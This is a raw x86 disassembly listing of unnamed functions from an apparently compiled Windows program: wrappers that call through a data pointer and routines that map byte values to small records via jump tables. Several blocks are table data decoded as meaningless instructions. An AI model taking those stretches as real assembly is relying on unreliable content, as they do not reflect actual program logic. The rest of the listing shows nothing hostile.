mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_485e80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_485ecc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_485f18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_485f5c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_485fac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_485ff0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_486038
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
movzx edx [ ebx ]
mov eax esi
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_4860a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
movzx ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_486038
pop ebx
pop ebp
retn 0xc
sub_4860bc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
movzx ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_486038
pop ebx
pop ebp
retn 0xc
sub_4860d8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] edx
mov edi [ ebp + 0x14 ]
movzx edx [ ebp - 0x10 ]
call sub_485d44
mov esi eax
mov ebx edi
test ebx ebx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax edi
call sub_406f20
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub ebx 0x4
mov eax [ ebx ]
shr eax 0x1
mov ebx eax
sub_486148
mov [ ecx ] 0x0
movzx eax dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_4861cc
mov [ ecx ] 0x1
mov eax edx
sub al 0x2
jne r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_4861f4
mov [ ecx ] 0x2
mov eax edx
add al 0xfe
sub al 0x4
jae r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_486220
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_48625c
mov [ ecx ] 0x4
movzx eax dl
cmp eax 0x20
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_486279 ]
jmp [ eax * 4 + jump_table_48629a ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x12
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x15
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x19
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1d
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x20
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_486286
add eax [ esp + eax ]
add al 0x5
push es
push es
push es
pop es
pop es
pop es
or [ ecx ] cl
or cl [ edx ]
or cl [ ebx ]
or ecx [ ebx ]
or al 0x7f
arpl [ eax ] cx
into
bound ecx [ eax ]
fbld [ edx + 0x48 ]
add al dh
bound ecx [ eax ]
add [ ebx + 0x48 ] esp
add [ edi ] cl
arpl [ eax ] cx
sbb eax 0x2b004863
arpl [ eax ] cx
cmp [ ebx + 0x48 ] esp
add [ edi + 0x63 ] al
dec eax
add [ ebp + 0x63 ] dl
dec eax
add [ ebx + 0x63 ] ah
dec eax
add [ ecx + 0x63 ] dh
dec eax
add bh al
inc ecx
add al 0x1
add [ eax ] al
add [ eax + 0x2 ] bh
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_486390
mov [ ecx ] 0x5
mov eax edx
add al 0xfe
sub al 0x3
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub al 0x3
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
sub al 0x3
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
sub al 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_4863f4
mov [ ecx ] 0x6
movzx eax dl
cmp eax 0xa
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
jmp [ eax * 4 + jump_table_486406 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x9
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xa
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_48648c
mov [ ecx ] 0x7
movzx eax dl
cmp eax 0x9
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
jmp [ eax * 4 + jump_table_4864a2 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x6
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x7
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x9
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_486530
mov [ ecx ] 0x8
mov eax edx
add al 0xfe
sub al 0x4
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub al 0x4
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x6
jmp r-xdata
sub al 0x4
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xa
jmp r-xdata
sub al 0x4
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_486594
mov [ ecx ] 0x9
mov eax edx
sub al 0x2
je r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
dec al
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
dec al
je r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
dec al
je r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x5
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_4865f4
mov [ ecx ] 0xa
movzx eax dl
cmp eax 0x11
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_48660d ]
jmp [ eax * 4 + jump_table_48661f ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xa
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_486690
mov [ ecx ] 0xb
movzx eax dl
cmp eax 0x33
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_4866ad ]
jmp [ eax * 4 + jump_table_4866e1 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x12
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x22
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x26
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x2a
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x2e
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x32
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_4866b8
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ edx ] eax
add al [ edx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ esp + eax ]
add al 0x4
add eax 0x6050505
push es
push es
push es
pop es
pop es
pop es
pop es
or [ eax ] cl
or [ eax ] cl
or [ ecx ] ecx
or [ ecx ] ecx
or cl [ edx ]
pushfd
dec eax
add [ 0x1e004867 ] cl
dec eax
add [ edi ] ch
dec eax
add [ edx ] bh
dec eax
add [ eax + 0x67 ] cl
dec eax
add [ esi + 0x67 ] dl
dec eax
add [ edi + 0x48 ] ah
add [ edx + 0x67 ] dh
dec eax
add [ eax - 0x71ffb799 ] al
dec eax
add bh al
inc ecx
add al 0x1
add [ eax ] al
add [ eax + 0x2 ] bh
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_4867b0
mov [ ecx ] 0xc
mov eax edx
add al 0xfe
sub al 0x4
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub al 0x4
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x6
jmp r-xdata
sub al 0x4
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xa
jmp r-xdata
sub al 0x4
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_486814
mov [ ecx ] 0xd
movzx eax dl
cmp eax 0x10
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
jmp [ eax * 4 + jump_table_48682a ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x7
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x9
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0xa
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0xc
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0xf
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x10
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_486920
mov [ ecx ] 0xe
mov eax edx
sub al 0x2
je r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
dec al
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
dec al
je r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_486970
mov [ ecx ] 0xf
movzx eax dl
cmp eax 0x2b
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_48698d ]
jmp [ eax * 4 + jump_table_4869b9 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xc
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x1b
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x25
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x2a
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x2b
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_486998
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al 0x4
add al 0x4
add al 0x5
add eax 0x6050505
push es
push es
push es
push es
pop es
pop es
pop es
pop es
pop es
or [ eax ] cl
or [ eax ] cl
or [ ecx ] cl
or dh [ edx + ebp * 2 + 0x48 ]
add ch ah
imul ecx [ eax ] r-xdata
add al 0x6a
dec eax
add [ edx ] dl
push 0x48
add [ eax ] ah
push 0x48
add [ esi ] ch
push 0x48
add [ edx + ebp * 2 ] bh
dec eax
add [ edx + 0x6a ] cl
dec eax
add [ eax + 0x6a ] bl
dec eax
add [ esi + 0x6a ] ah
dec eax
add bh al
inc ecx
add al 0x1
add [ eax ] al
add [ eax + 0x2 ] bh
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_486a88
mov [ ecx ] 0x10
mov eax edx
sub al 0x2
je r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
dec al
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
dec al
je r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_486ad8
mov [ ecx ] 0x11
mov eax edx
sub al 0x2
jne r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_486b00
mov [ ecx ] 0x12
movzx eax dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_486b98
mov [ ecx ] 0x13
movzx eax dl
cmp eax 0xe
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
jmp [ eax * 4 + jump_table_486bae ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x4
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x6
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x1
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x6
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xc
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_486c60
mov [ ecx ] 0x14
movzx eax dl
cmp eax 0x23
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_486c7d ]
jmp [ eax * 4 + jump_table_486ca1 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x9
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x13
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x1d
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x22
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x23
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_486c88
add al 0x4
add al 0x5
add eax 0x6050505
push es
push es
push es
push es
pop es
pop es
pop es
pop es
pop es
or [ eax ] cl
or [ eax ] cl
or [ ecx ] cl
or bl [ ebp + ebp * 2 + 0x48 ]
add ch cl
insb
dec eax
add dh bl
insb
dec eax
add ah ch
insb
dec eax
add dl bh
insb
dec eax
add [ eax ] cl
insd
dec eax
add [ esi ] dl
insd
dec eax
add [ ebp * 2 + 0x6d320048 ] ah
dec eax
add [ eax + 0x6d ] al
dec eax
add [ esi + 0x6d ] cl
dec eax
add bh al
inc ecx
add al 0x1
add [ eax ] al
add [ eax + 0x2 ] bh
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_486d70
mov [ ecx ] 0x15
mov eax edx
sub al 0x2
je r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
dec al
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_486dac
mov [ ecx ] 0x16
mov eax edx
add al 0xfe
sub al 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub al 0x2
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_486dfc
mov [ ecx ] 0x17
movzx eax dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_486e19 ]
jmp [ eax * 4 + jump_table_486e82 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
